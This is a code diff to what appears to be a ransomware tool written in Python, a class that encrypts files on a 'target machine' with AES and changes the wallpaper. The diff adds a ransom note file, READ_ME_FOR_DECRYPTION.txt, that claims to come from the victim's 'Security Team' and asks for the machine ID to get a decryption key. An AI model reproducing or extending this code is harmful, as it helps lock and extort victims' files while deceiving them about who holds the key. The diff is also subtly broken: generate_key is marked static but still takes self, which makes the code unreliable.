@@ -10,7 +10,7 @@ import os
 import sys
 import uuid
 from os import makedirs
-
+from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
@@ -126,7 +126,7 @@ class EncryptionTool:
         self.key = self.generate_key(password)
         self.machine_id = str(uuid.uuid4())
 
-    # @staticmethod
+    @staticmethod
     def generate_key(self, password):
         """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
         :param: password
@@ -158,7 +158,8 @@ class EncryptionTool:
             logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")
 
     # Function to Create Important Files on the target machine
-    def create_important_files(self, directory_path):
+    @staticmethod
+    def create_important_files(directory_path):
         try:
             # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
             dDataPath = os.path.join(directory_path, "D-Data")
@@ -237,6 +238,25 @@ class EncryptionTool:
         except Exception as e:
             # Submit Error Log for files encryption in the Log Console
             logging.error(f"[-] Failed to Encrypt files in {directory_path} => Error: {str(e)}")
+
+    # Function to create a user manual
+    def create_user_manual(self, directory_path):
+        manualContent = f"""Dear User,
+Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}
+Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
+In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
+Thank you,
+Your Security Team
+"""
+        manualPath = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
+        try:
+            with open(manualPath, "w") as file:
+                file.write(manualContent)
+            logging.info(f"[+] User Manual Created Successfully in {directory_path}.")
+        except Exception as e:
+            logging.error(f"[-] Failed to create user manual. Error: {str(e)}")
+
+
 
 
 if __name__ == "__main__":
